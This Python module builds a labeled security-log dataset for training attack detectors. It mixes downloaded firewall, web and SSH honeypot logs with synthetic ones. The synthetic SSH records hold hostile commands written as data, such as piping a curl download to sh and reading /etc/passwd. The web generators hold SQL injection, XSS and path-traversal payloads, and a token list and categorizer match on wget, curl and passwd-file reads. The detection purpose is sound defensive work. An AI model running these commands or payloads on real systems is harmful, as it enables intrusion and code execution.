from __future__ import annotations

import gzip
import json
import re
import shutil
import tarfile
import urllib.request
import zipfile
from dataclasses import asdict, dataclass, field
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Literal

import numpy as np
import pandas as pd


UCI_FIREWALL_URL = "https://archive.ics.uci.edu/static/public/542/internet+firewall+data.zip"
NASA_WEB_LOG_URL = "http://ita.ee.lbl.gov/traces/NASA_access_log_Jul95.gz"
ZENODO_SSH_HONEYPOT_URL = (
    "https://zenodo.org/records/19629701/files/ssh_attack_dataset_2025.csv.tar.gz?download=1"
)

COMMON_LOG_RE = re.compile(
    r'(?P<src_ip>\S+) \S+ \S+ \[(?P<timestamp>[^\]]+)\] '
    r'"(?P<request>[^"]*)" (?P<status>\S+) (?P<bytes>\S+)'
)

SUSPICIOUS_WEB_PATTERNS = [
    "../",
    "%2e%2e",
    "etc/passwd",
    "union",
    "select",
    "sleep(",
    "benchmark(",
    "<script",
    "%3cscript",
    "wp-login",
    ".env",
    "phpmyadmin",
]

PRIVILEGED_USERS = {"root", "admin", "administrator", "oracle", "postgres", "mysql", "ubuntu", "ec2-user"}
COMMON_SERVICES = {
    20: "ftp_data",
    21: "ftp",
    22: "ssh",
    23: "telnet",
    25: "smtp",
    53: "dns",
    80: "http",
    110: "pop3",
    123: "ntp",
    143: "imap",
    443: "https",
    445: "smb",
    993: "imaps",
    995: "pop3s",
    1433: "mssql",
    1521: "oracle",
    3306: "mysql",
    3389: "rdp",
    5432: "postgres",
    5900: "vnc",
    6379: "redis",
    8080: "http_alt",
}

NUMERIC_COLUMNS = [
    "hour",
    "day_of_week",
    "is_weekend",
    "src_port",
    "dst_port",
    "duration_seconds",
    "total_bytes",
    "bytes_sent",
    "bytes_received",
    "packets",
    "packets_sent",
    "packets_received",
    "status_code",
    "url_length",
    "query_length",
    "url_depth",
    "suspicious_path_tokens",
    "user_agent_length",
    "ssh_failed_logins_10m",
    "ssh_invalid_user",
    "ssh_privileged_username",
    "ssh_success_after_failures",
    "firewall_is_allowed",
    "firewall_is_blocked",
    "denied_admin_port",
    "src_event_count",
]

CATEGORICAL_COLUMNS = [
    "log_source",
    "event_type",
    "protocol",
    "service",
    "http_method",
    "http_status_family",
    "http_user_agent_family",
    "firewall_action",
    "ssh_auth_result",
    "username_type",
    "source_dataset",
]

RAW_CONTEXT_COLUMNS = [
    "timestamp",
    "src_ip",
    "dst_ip",
    "username",
    "url_path",
    "user_agent",
    "raw_message",
]


@dataclass
class SourceLoadReport:
    source: str
    rows: int = 0
    status: str = "skipped"
    detail: str = ""


@dataclass
class MultisourceDatasetInfo:
    source: str
    path: str
    rows: int
    columns: int
    source_reports: list[SourceLoadReport] = field(default_factory=list)

    def to_dict(self) -> dict[str, object]:
        payload = asdict(self)
        payload["source_reports"] = [asdict(report) for report in self.source_reports]
        return payload


def acquire_multisource_dataset(
    raw_dir: Path,
    processed_dir: Path,
    source: Literal["auto", "synthetic"] = "auto",
    rows_per_synthetic_source: int = 12_000,
    real_firewall_limit: int = 15_000,
    real_web_limit: int = 8_000,
    real_ssh_limit: int = 8_000,
    random_state: int = 42,
) -> tuple[pd.DataFrame, MultisourceDatasetInfo]:
    raw_dir.mkdir(parents=True, exist_ok=True)
    processed_dir.mkdir(parents=True, exist_ok=True)

    rng = np.random.default_rng(random_state)
    frames: list[pd.DataFrame] = []
    reports: list[SourceLoadReport] = []

    if source == "auto":
        loaders = [
            ("uci_firewall", lambda: load_uci_firewall(raw_dir, real_firewall_limit, random_state)),
            ("nasa_web_access", lambda: load_nasa_web_logs(raw_dir, real_web_limit, random_state)),
            ("zenodo_ssh_honeypot", lambda: load_zenodo_ssh_honeypot(raw_dir, real_ssh_limit, random_state)),
        ]
        for name, loader in loaders:
            try:
                frame = loader()
                if not frame.empty:
                    frames.append(frame)
                reports.append(SourceLoadReport(source=name, rows=len(frame), status="loaded"))
            except Exception as exc:
                reports.append(SourceLoadReport(source=name, status="failed", detail=f"{type(exc).__name__}: {exc}"))

    synthetic_frames = [
        simulate_ssh_logs(rows_per_synthetic_source, rng),
        simulate_web_logs(rows_per_synthetic_source, rng),
        simulate_firewall_logs(rows_per_synthetic_source, rng),
    ]
    frames.extend(synthetic_frames)
    reports.extend(
        [
            SourceLoadReport(source="synthetic_ssh", rows=len(synthetic_frames[0]), status="loaded"),
            SourceLoadReport(source="synthetic_web", rows=len(synthetic_frames[1]), status="loaded"),
            SourceLoadReport(source="synthetic_firewall", rows=len(synthetic_frames[2]), status="loaded"),
        ]
    )

    df = pd.concat(frames, ignore_index=True)
    df = finalize_multisource_frame(df, rng)
    output_path = processed_dir / "multisource_security_logs_labeled.csv"
    df.to_csv(output_path, index=False)

    manifest_path = processed_dir / "multisource_source_manifest.json"
    manifest = {
        "dataset_path": str(output_path),
        "rows": int(len(df)),
        "columns": int(len(df.columns)),
        "source_reports": [asdict(report) for report in reports],
    }
    manifest_path.write_text(json.dumps(manifest, indent=2), encoding="utf-8")

    info = MultisourceDatasetInfo(
        source="mixed_real_and_synthetic_logs" if source == "auto" else "synthetic_multisource_logs",
        path=str(output_path),
        rows=len(df),
        columns=len(df.columns),
        source_reports=reports,
    )
    return df, info


def download_url(url: str, output_path: Path, timeout: int = 90) -> Path:
    if output_path.exists() and output_path.stat().st_size > 0:
        return output_path

    request = urllib.request.Request(
        url,
        headers={"User-Agent": "cyber-log-attack-detection/1.0"},
    )
    with urllib.request.urlopen(request, timeout=timeout) as response:
        with output_path.open("wb") as file_obj:
            shutil.copyfileobj(response, file_obj)
    return output_path


def load_uci_firewall(raw_dir: Path, limit: int, random_state: int) -> pd.DataFrame:
    zip_path = download_url(UCI_FIREWALL_URL, raw_dir / "internet_firewall_data.zip")
    with zipfile.ZipFile(zip_path) as archive:
        csv_names = [name for name in archive.namelist() if name.lower().endswith(".csv")]
        if not csv_names:
            raise ValueError("No CSV file found in UCI firewall archive")
        with archive.open(csv_names[0]) as file_obj:
            raw = pd.read_csv(file_obj)

    raw.columns = [normalize_column_name(col) for col in raw.columns]
    if limit and len(raw) > limit:
        raw = raw.sample(n=limit, random_state=random_state)

    rows = []
    for _, row in raw.iterrows():
        action = str(row.get("action", "unknown")).strip().lower()
        dst_port = safe_int(row.get("destination_port", row.get("dst_port", 0)))
        src_port = safe_int(row.get("source_port", row.get("src_port", 0)))
        is_allowed = int(action == "allow")
        is_blocked = int(action != "allow")
        rows.append(
            make_record(
                log_source="firewall",
                source_dataset="uci_internet_firewall_data",
                binary_label="normal" if is_allowed else "attack",
                attack_category="normal" if is_allowed else "firewall_block",
                event_type=f"firewall_{action}",
                protocol="network",
                service=port_to_service(dst_port),
                firewall_action=action,
                firewall_is_allowed=is_allowed,
                firewall_is_blocked=is_blocked,
                denied_admin_port=int(is_blocked and dst_port in {22, 23, 445, 3389, 5900}),
                src_port=src_port,
                dst_port=dst_port,
                duration_seconds=safe_float(row.get("elapsed_time_sec", row.get("elapsed_time_sec_", 0))),
                total_bytes=safe_float(row.get("bytes", 0)),
                bytes_sent=safe_float(row.get("bytes_sent", 0)),
                bytes_received=safe_float(row.get("bytes_received", 0)),
                packets=safe_float(row.get("packets", 0)),
                packets_sent=safe_float(row.get("pkts_sent", row.get("packets_sent", 0))),
                packets_received=safe_float(row.get("pkts_received", row.get("packets_received", 0))),
                raw_message=f"{action} src_port={src_port} dst_port={dst_port}",
            )
        )
    return pd.DataFrame(rows)


def load_nasa_web_logs(raw_dir: Path, limit: int, random_state: int) -> pd.DataFrame:
    gz_path = download_url(NASA_WEB_LOG_URL, raw_dir / "NASA_access_log_Jul95.gz")
    rows = []
    with gzip.open(gz_path, "rt", encoding="latin-1", errors="ignore") as file_obj:
        for line in file_obj:
            record = parse_common_web_log(line, source_dataset="nasa_http_access_log_jul95")
            if record:
                rows.append(record)
            if limit and len(rows) >= limit:
                break

    if not rows:
        raise ValueError("No parseable NASA web log rows found")

    frame = pd.DataFrame(rows)
    rng = np.random.default_rng(random_state)
    attack_rows = simulate_web_attacks_from_base(frame, max(500, min(limit // 2, 4_000)), rng)
    return pd.concat([frame, attack_rows], ignore_index=True)


def load_zenodo_ssh_honeypot(raw_dir: Path, limit: int, random_state: int) -> pd.DataFrame:
    tar_path = download_url(ZENODO_SSH_HONEYPOT_URL, raw_dir / "ssh_attack_dataset_2025.csv.tar.gz")
    with tarfile.open(tar_path, "r:gz") as archive:
        members = [member for member in archive.getmembers() if member.name.lower().endswith(".csv")]
        if not members:
            raise ValueError("No CSV file found in SSH honeypot archive")
        extracted = archive.extractfile(members[0])
        if extracted is None:
            raise ValueError(f"Could not extract {members[0].name}")
        raw = pd.read_csv(extracted, nrows=limit)

    raw.columns = [normalize_column_name(col) for col in raw.columns]
    rows = []
    for _, row in raw.iterrows():
        event_type = first_present(row, ["eventid", "event_id", "event_type", "type", "message"], "ssh_honeypot")
        command = first_present(row, ["input", "command", "cmd", "payload"], "")
        username = first_present(row, ["username", "user", "login", "userid"], "")
        src_ip = first_present(row, ["src_ip", "source_ip", "remote_ip", "host", "ip"], "")
        src_port = safe_int(first_present(row, ["src_port", "source_port", "remote_port"], 0))
        timestamp = first_present(row, ["timestamp", "time", "datetime", "date"], "")
        category = categorize_ssh_honeypot_event(str(event_type), str(username), str(command))
        rows.append(
            make_record(
                log_source="ssh",
                source_dataset="zenodo_ssh_honeypot_2025",
                binary_label="attack",
                attack_category=category,
                event_type=f"ssh_{str(event_type).lower()[:60]}",
                protocol="tcp",
                service="ssh",
                timestamp=str(timestamp),
                src_ip=str(src_ip),
                src_port=src_port,
                dst_port=22,
                username=str(username),
                username_type=username_type(str(username)),
                ssh_auth_result=ssh_auth_result(str(event_type), category),
                ssh_failed_logins_10m=18 if category in {"ssh_bruteforce", "ssh_invalid_user_scan"} else 2,
                ssh_invalid_user=int("invalid" in str(event_type).lower() or username_type(str(username)) == "suspicious"),
                ssh_privileged_username=int(str(username).lower() in PRIVILEGED_USERS),
                ssh_success_after_failures=int(category == "ssh_suspicious_success"),
                raw_message=f"{event_type} {username} {command}".strip(),
            )
        )
    if not rows:
        raise ValueError("No parseable SSH honeypot rows found")
    return pd.DataFrame(rows)


def simulate_ssh_logs(n_rows: int, rng: np.random.Generator) -> pd.DataFrame:
    categories = rng.choice(
        ["normal", "ssh_bruteforce", "ssh_invalid_user_scan", "ssh_suspicious_success", "ssh_post_auth_command"],
        size=n_rows,
        p=[0.45, 0.27, 0.13, 0.08, 0.07],
    )
    users = ["ubuntu", "deploy", "webapp", "backup", "root", "admin", "test", "oracle", "postgres"]
    rows = []
    base_time = datetime(2026, 5, 17, tzinfo=timezone.utc)

    for idx, category in enumerate(categories):
        username = str(rng.choice(users))
        src_ip = random_private_ip(rng)
        timestamp = (base_time + timedelta(seconds=int(idx * 17 + rng.integers(0, 15)))).isoformat()
        src_port = int(rng.integers(10_000, 65_535))
        common = {
            "log_source": "ssh",
            "source_dataset": "synthetic_ssh_auth_logs",
            "protocol": "tcp",
            "service": "ssh",
            "timestamp": timestamp,
            "src_ip": src_ip,
            "src_port": src_port,
            "dst_port": 22,
        }

        if category == "normal":
            event_type = str(rng.choice(["ssh_accepted_publickey", "ssh_accepted_password", "ssh_single_failed_password"]))
            failed = int(event_type == "ssh_single_failed_password")
            rows.append(
                make_record(
                    **common,
                    binary_label="normal",
                    attack_category="normal",
                    event_type=event_type,
                    username=username,
                    username_type=username_type(username),
                    ssh_auth_result="accepted" if "accepted" in event_type else "failed",
                    ssh_failed_logins_10m=failed,
                    ssh_privileged_username=int(username.lower() in PRIVILEGED_USERS),
                    raw_message=f"{event_type} for {username} from {src_ip}",
                )
            )
        elif category == "ssh_bruteforce":
            failed = int(rng.integers(15, 120))
            rows.append(
                make_record(
                    **common,
                    binary_label="attack",
                    attack_category=category,
                    event_type="ssh_auth_failure",
                    username=str(rng.choice(["root", "admin", "ubuntu", "mysql"])),
                    username_type="privileged",
                    ssh_auth_result="failed",
                    ssh_failed_logins_10m=failed,
                    ssh_invalid_user=0,
                    raw_message=f"Failed password burst count={failed} from {src_ip}",
                )
            )
        elif category == "ssh_invalid_user_scan":
            invalid_user = str(rng.choice(["oracle", "test", "guest", "support", "sales", "user1"]))
            failed = int(rng.integers(5, 45))
            rows.append(
                make_record(
                    **common,
                    binary_label="attack",
                    attack_category=category,
                    event_type="ssh_auth_failure",
                    username=invalid_user,
                    username_type=username_type(invalid_user),
                    ssh_auth_result="failed",
                    ssh_failed_logins_10m=failed,
                    ssh_invalid_user=1,
                    raw_message=f"Invalid user {invalid_user} from {src_ip}",
                )
            )
        elif category == "ssh_suspicious_success":
            failed = int(rng.integers(8, 70))
            rows.append(
                make_record(
                    **common,
                    binary_label="attack",
                    attack_category=category,
                    event_type="ssh_auth_success",
                    username=username,
                    username_type=username_type(username),
                    ssh_auth_result="accepted",
                    ssh_failed_logins_10m=failed,
                    ssh_privileged_username=int(username.lower() in PRIVILEGED_USERS),
                    ssh_success_after_failures=1,
                    raw_message=f"Accepted password for {username} after {failed} failures from {src_ip}",
                )
            )
        else:
            command = str(rng.choice(["wget http://x/m.sh", "curl -fsSL http://x | sh", "chmod +x bot", "cat /etc/passwd"]))
            rows.append(
                make_record(
                    **common,
                    binary_label="attack",
                    attack_category=category,
                    event_type="ssh_command",
                    username=username,
                    username_type=username_type(username),
                    ssh_auth_result="post_auth",
                    ssh_failed_logins_10m=int(rng.integers(0, 5)),
                    ssh_privileged_username=int(username.lower() in PRIVILEGED_USERS),
                    raw_message=command,
                )
            )
    return pd.DataFrame(rows)


def simulate_web_logs(n_rows: int, rng: np.random.Generator) -> pd.DataFrame:
    categories = rng.choice(
        ["normal", "web_sql_injection", "web_xss", "web_path_traversal", "web_scanner"],
        size=n_rows,
        p=[0.52, 0.17, 0.10, 0.10, 0.11],
    )
    rows = []
    base_time = datetime(2026, 5, 17, tzinfo=timezone.utc)
    normal_paths = ["/", "/login", "/dashboard", "/api/items", "/static/app.css", "/docs", "/health"]
    attack_paths = {
        "web_sql_injection": ["/login?user=admin' OR '1'='1", "/search?q=1 UNION SELECT password FROM users"],
        "web_xss": ["/comment?text=<script>alert(1)</script>", "/profile?name=%3Cscript%3Efetch('/token')"],
        "web_path_traversal": ["/download?file=../../../../etc/passwd", "/static/%2e%2e/%2e%2e/boot.ini"],
        "web_scanner": ["/.env", "/wp-login.php", "/phpmyadmin/index.php", "/server-status"],
    }
    agents = ["Mozilla/5.0", "curl/8.1", "python-requests/2.31", "sqlmap/1.7", "Nikto/2.5"]

    for idx, category in enumerate(categories):
        timestamp = (base_time + timedelta(seconds=int(idx * 9 + rng.integers(0, 9)))).isoformat()
        if category == "normal":
            path = str(rng.choice(normal_paths))
            status = int(rng.choice([200, 200, 200, 204, 301, 304, 404]))
            method = str(rng.choice(["GET", "GET", "POST"]))
            user_agent = str(rng.choice(agents[:3]))
            label = "normal"
        else:
            path = str(rng.choice(attack_paths[category]))
            status = int(rng.choice([400, 403, 404, 500]))
            method = str(rng.choice(["GET", "POST"]))
            user_agent = str(rng.choice(agents[2:]))
            label = "attack"

        rows.append(
            make_web_record(
                source_dataset="synthetic_web_server_logs",
                timestamp=timestamp,
                src_ip=random_public_ip(rng),
                method=method,
                path=path,
                status=status,
                response_bytes=float(max(0, rng.normal(4000, 1200))),
                user_agent=user_agent,
                binary_label=label,
                attack_category=category,
            )
        )
    return pd.DataFrame(rows)


def simulate_firewall_logs(n_rows: int, rng: np.random.Generator) -> pd.DataFrame:
    categories = rng.choice(
        ["normal", "firewall_block", "firewall_port_scan", "firewall_suspicious_outbound"],
        size=n_rows,
        p=[0.55, 0.22, 0.14, 0.09],
    )
    rows = []
    base_time = datetime(2026, 5, 17, tzinfo=timezone.utc)
    for idx, category in enumerate(categories):
        timestamp = (base_time + timedelta(seconds=int(idx * 5 + rng.integers(0, 5)))).isoformat()
        src_port = int(rng.integers(1024, 65_535))
        if category == "normal":
            dst_port = int(rng.choice([53, 80, 123, 443, 22]))
            action = "allow"
            label = "normal"
            packets = float(max(1, rng.normal(18, 8)))
            total_bytes = float(max(60, rng.normal(12_000, 6_000)))
            src_event_count = int(rng.integers(1, 8))
        elif category == "firewall_block":
            dst_port = int(rng.choice([22, 23, 445, 3389, 5900, 6379]))
            action = str(rng.choice(["deny", "drop", "reset-both"]))
            label = "attack"
            packets = float(max(1, rng.normal(4, 2)))
            total_bytes = float(max(40, rng.normal(900, 500)))
            src_event_count = int(rng.integers(8, 35))
        elif category == "firewall_port_scan":
            dst_port = int(rng.integers(1, 65_535))
            action = str(rng.choice(["deny", "drop"]))
            label = "attack"
            packets = float(max(1, rng.normal(2, 1)))
            total_bytes = float(max(40, rng.normal(250, 120)))
            src_event_count = int(rng.integers(40, 180))
        else:
            dst_port = int(rng.choice([4444, 6667, 1337, 31337, 8080]))
            action = str(rng.choice(["allow", "deny", "drop"]))
            label = "attack"
            packets = float(max(8, rng.normal(90, 35)))
            total_bytes = float(max(1000, rng.normal(220_000, 80_000)))
            src_event_count = int(rng.integers(10, 50))

        rows.append(
            make_record(
                log_source="firewall",
                source_dataset="synthetic_firewall_logs",
                binary_label=label,
                attack_category=category,
                event_type=f"firewall_{action}",
                protocol="network",
                service=port_to_service(dst_port),
                timestamp=timestamp,
                src_ip=random_private_ip(rng),
                src_port=src_port,
                dst_port=dst_port,
                firewall_action=action,
                firewall_is_allowed=int(action == "allow"),
                firewall_is_blocked=int(action != "allow"),
                denied_admin_port=int(action != "allow" and dst_port in {22, 23, 445, 3389, 5900}),
                duration_seconds=float(max(0, rng.exponential(3))),
                total_bytes=total_bytes,
                bytes_sent=total_bytes * float(rng.uniform(0.35, 0.85)),
                bytes_received=total_bytes * float(rng.uniform(0.05, 0.55)),
                packets=packets,
                packets_sent=packets * float(rng.uniform(0.4, 0.8)),
                packets_received=packets * float(rng.uniform(0.2, 0.6)),
                src_event_count=src_event_count,
                raw_message=f"{action} src_port={src_port} dst_port={dst_port}",
            )
        )
    return pd.DataFrame(rows)


def parse_common_web_log(line: str, source_dataset: str) -> dict[str, object] | None:
    match = COMMON_LOG_RE.match(line.strip())
    if not match:
        return None

    request = match.group("request")
    parts = request.split()
    method = parts[0] if parts else "UNKNOWN"
    path = parts[1] if len(parts) > 1 else "/"
    status = safe_int(match.group("status"))
    response_bytes = 0 if match.group("bytes") == "-" else safe_float(match.group("bytes"))
    timestamp = parse_apache_timestamp(match.group("timestamp"))

    return make_web_record(
        source_dataset=source_dataset,
        timestamp=timestamp,
        src_ip=match.group("src_ip"),
        method=method,
        path=path,
        status=status,
        response_bytes=response_bytes,
        user_agent="unknown",
        binary_label="normal",
        attack_category="normal",
        raw_message=line.strip(),
    )


def simulate_web_attacks_from_base(base: pd.DataFrame, n_rows: int, rng: np.random.Generator) -> pd.DataFrame:
    if base.empty:
        return pd.DataFrame()
    samples = base.sample(n=n_rows, replace=True, random_state=int(rng.integers(0, 1_000_000)))
    categories = rng.choice(
        ["web_sql_injection", "web_xss", "web_path_traversal", "web_scanner"],
        size=n_rows,
        p=[0.35, 0.20, 0.20, 0.25],
    )
    rows = []
    for (_, base_row), category in zip(samples.iterrows(), categories, strict=False):
        if category == "web_sql_injection":
            path = "/search?q=1%27%20UNION%20SELECT%20password%20FROM%20users"
            agent = "sqlmap/1.7"
        elif category == "web_xss":
            path = "/comment?text=%3Cscript%3Ealert(1)%3C/script%3E"
            agent = "Mozilla/5.0"
        elif category == "web_path_traversal":
            path = "/download?file=../../../../etc/passwd"
            agent = "curl/8.1"
        else:
            path = str(rng.choice(["/.env", "/wp-login.php", "/phpmyadmin/index.php", "/server-status"]))
            agent = "Nikto/2.5"

        rows.append(
            make_web_record(
                source_dataset="synthetic_attacks_on_nasa_web_log",
                timestamp=str(base_row.get("timestamp", "")),
                src_ip=random_public_ip(rng),
                method=str(rng.choice(["GET", "POST"])),
                path=path,
                status=int(rng.choice([400, 403, 404, 500])),
                response_bytes=float(rng.integers(128, 4096)),
                user_agent=agent,
                binary_label="attack",
                attack_category=category,
            )
        )
    return pd.DataFrame(rows)


def make_web_record(
    source_dataset: str,
    timestamp: str,
    src_ip: str,
    method: str,
    path: str,
    status: int,
    response_bytes: float,
    user_agent: str,
    binary_label: str,
    attack_category: str,
    raw_message: str = "",
) -> dict[str, object]:
    path_lower = path.lower()
    query_length = len(path.split("?", 1)[1]) if "?" in path else 0
    suspicious_count = sum(1 for token in SUSPICIOUS_WEB_PATTERNS if token in path_lower)
    return make_record(
        log_source="web",
        source_dataset=source_dataset,
        binary_label=binary_label,
        attack_category=attack_category,
        event_type="web_access",
        protocol="http",
        service="web",
        timestamp=timestamp,
        src_ip=src_ip,
        dst_port=443 if "https" in path_lower else 80,
        http_method=method.upper(),
        http_status_family=f"{status // 100}xx" if status else "unknown",
        http_user_agent_family=user_agent_family(user_agent),
        status_code=status,
        url_path=path,
        url_length=len(path),
        query_length=query_length,
        url_depth=max(0, path.split("?", 1)[0].count("/") - 1),
        suspicious_path_tokens=suspicious_count,
        user_agent=user_agent,
        user_agent_length=len(user_agent),
        total_bytes=response_bytes,
        bytes_received=response_bytes,
        raw_message=raw_message,
    )


def make_record(**overrides: object) -> dict[str, object]:
    record: dict[str, object] = {
        "binary_label": "normal",
        "attack_category": "normal",
        "timestamp": "",
        "src_ip": "",
        "dst_ip": "",
        "username": "",
        "url_path": "",
        "user_agent": "",
        "raw_message": "",
    }
    for col in CATEGORICAL_COLUMNS:
        record[col] = "unknown"
    for col in NUMERIC_COLUMNS:
        record[col] = 0
    record.update(overrides)
    return record


def finalize_multisource_frame(df: pd.DataFrame, rng: np.random.Generator) -> pd.DataFrame:
    for col in [*NUMERIC_COLUMNS, *CATEGORICAL_COLUMNS, *RAW_CONTEXT_COLUMNS, "binary_label", "attack_category"]:
        if col not in df.columns:
            df[col] = 0 if col in NUMERIC_COLUMNS else ""

    timestamps = pd.to_datetime(df["timestamp"], errors="coerce", utc=True)
    missing_time = timestamps.isna()
    if missing_time.any():
        fallback_start = pd.Timestamp("2026-05-17T00:00:00Z")
        offsets = pd.to_timedelta(rng.integers(0, 86_400, size=int(missing_time.sum())), unit="s")
        timestamps.loc[missing_time] = fallback_start + offsets

    df["timestamp"] = timestamps.dt.strftime("%Y-%m-%dT%H:%M:%SZ")
    df["hour"] = timestamps.dt.hour.astype(int)
    df["day_of_week"] = timestamps.dt.dayofweek.astype(int)
    df["is_weekend"] = timestamps.dt.dayofweek.isin([5, 6]).astype(int)

    for col in NUMERIC_COLUMNS:
        df[col] = pd.to_numeric(df[col], errors="coerce").fillna(0)

    src_ip = df["src_ip"].replace("", np.nan)
    counts = df.assign(_src_ip=src_ip).groupby(["log_source", "_src_ip"], dropna=True)["log_source"].transform("size")
    df["src_event_count"] = np.maximum(df["src_event_count"], counts.fillna(1).astype(float))

    df["dst_port"] = df["dst_port"].astype(int)
    df.loc[df["service"].isin(["", "unknown"]), "service"] = df.loc[
        df["service"].isin(["", "unknown"]), "dst_port"
    ].map(port_to_service)

    for col in CATEGORICAL_COLUMNS:
        df[col] = df[col].astype(str).fillna("unknown").replace("", "unknown")
    for col in RAW_CONTEXT_COLUMNS:
        df[col] = df[col].astype(str).fillna("")

    ordered_cols = [
        "binary_label",
        "attack_category",
        *CATEGORICAL_COLUMNS,
        *NUMERIC_COLUMNS,
        *RAW_CONTEXT_COLUMNS,
    ]
    return df[ordered_cols].sample(frac=1.0, random_state=int(rng.integers(0, 1_000_000))).reset_index(drop=True)


def parse_apache_timestamp(value: str) -> str:
    try:
        parsed = datetime.strptime(value, "%d/%b/%Y:%H:%M:%S %z")
        return parsed.astimezone(timezone.utc).isoformat()
    except Exception:
        return ""


def normalize_column_name(value: object) -> str:
    normalized = re.sub(r"[^a-z0-9]+", "_", str(value).strip().lower()).strip("_")
    return normalized


def safe_int(value: object, default: int = 0) -> int:
    try:
        if pd.isna(value):
            return default
        return int(float(value))
    except Exception:
        return default


def safe_float(value: object, default: float = 0.0) -> float:
    try:
        if pd.isna(value):
            return default
        return float(value)
    except Exception:
        return default


def first_present(row: pd.Series, columns: list[str], default: object) -> object:
    for col in columns:
        if col in row and not pd.isna(row[col]):
            return row[col]
    return default


def port_to_service(port: object) -> str:
    port_int = safe_int(port)
    if port_int in COMMON_SERVICES:
        return COMMON_SERVICES[port_int]
    if 0 < port_int < 1024:
        return "low_port_other"
    if 1024 <= port_int <= 49_151:
        return "registered_or_ephemeral"
    if port_int > 49_151:
        return "dynamic_high_port"
    return "unknown"


def username_type(username: str) -> str:
    clean = username.lower().strip()
    if not clean:
        return "unknown"
    if clean in {"root", "admin", "administrator"}:
        return "privileged"
    if clean in PRIVILEGED_USERS:
        return "service_or_cloud"
    if clean in {"test", "guest", "support", "sales", "user", "user1"}:
        return "suspicious"
    return "standard"


def user_agent_family(user_agent: str) -> str:
    clean = user_agent.lower()
    if "sqlmap" in clean:
        return "sqlmap"
    if "nikto" in clean:
        return "nikto"
    if "curl" in clean:
        return "curl"
    if "python" in clean or "requests" in clean:
        return "script"
    if "mozilla" in clean:
        return "browser"
    if clean in {"", "unknown"}:
        return "unknown"
    return "other"


def categorize_ssh_honeypot_event(event_type: str, username: str, command: str) -> str:
    event = event_type.lower()
    command_clean = command.lower()
    if any(token in command_clean for token in ["wget", "curl", "chmod", "sh ", "/etc/passwd", "busybox"]):
        return "ssh_post_auth_command"
    if "success" in event or "login" in event and "success" in event:
        return "ssh_suspicious_success"
    if "invalid" in event or username_type(username) == "suspicious":
        return "ssh_invalid_user_scan"
    if any(token in event for token in ["failed", "password", "login"]):
        return "ssh_bruteforce"
    return "ssh_probe"


def ssh_auth_result(event_type: str, category: str) -> str:
    clean = event_type.lower()
    if category == "ssh_post_auth_command":
        return "post_auth"
    if "success" in clean or "accepted" in clean:
        return "accepted"
    if "failed" in clean or "password" in clean or "login" in clean:
        return "failed"
    return "unknown"


def random_private_ip(rng: np.random.Generator) -> str:
    return f"10.{int(rng.integers(0, 255))}.{int(rng.integers(0, 255))}.{int(rng.integers(1, 255))}"


def random_public_ip(rng: np.random.Generator) -> str:
    return f"{int(rng.integers(11, 223))}.{int(rng.integers(0, 255))}.{int(rng.integers(0, 255))}.{int(rng.integers(1, 255))}"
